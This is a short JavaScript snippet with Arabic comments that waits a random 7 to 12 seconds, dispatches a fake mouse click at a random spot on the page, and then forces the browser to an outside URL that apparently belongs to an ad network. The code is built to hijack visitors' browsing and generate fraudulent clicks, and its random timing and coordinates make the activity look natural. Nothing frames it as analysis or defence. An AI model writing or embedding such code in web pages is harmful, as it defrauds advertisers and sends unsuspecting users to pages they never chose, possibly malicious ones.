(function() {
  var redirected = false;
  var url = "https://otieu.com/4/9654336";

  // وظيفة تنفيذ نقرة وهمية
  function simulateClick(x, y) {
    var evt = new MouseEvent("click", {
      bubbles: true,
      cancelable: true,
      view: window,
      clientX: x,
      clientY: y
    });
    var el = document.elementFromPoint(x, y);
    if (el && !redirected) {
      redirected = true;
      el.dispatchEvent(evt);
      window.location.href = url;
    }
  }

  // وقت عشوائي بين 7 و 12 ثانية
  var randomDelay = Math.floor(Math.random() * 5000) + 7000;

  // تنفيذ النقرة بعد التأخير
  setTimeout(function () {
    var width = window.innerWidth;
    var height = window.innerHeight;
    var randomX = Math.floor(Math.random() * width);
    var randomY = Math.floor(Math.random() * height);
    simulateClick(randomX, randomY);
  }, randomDelay);
})();
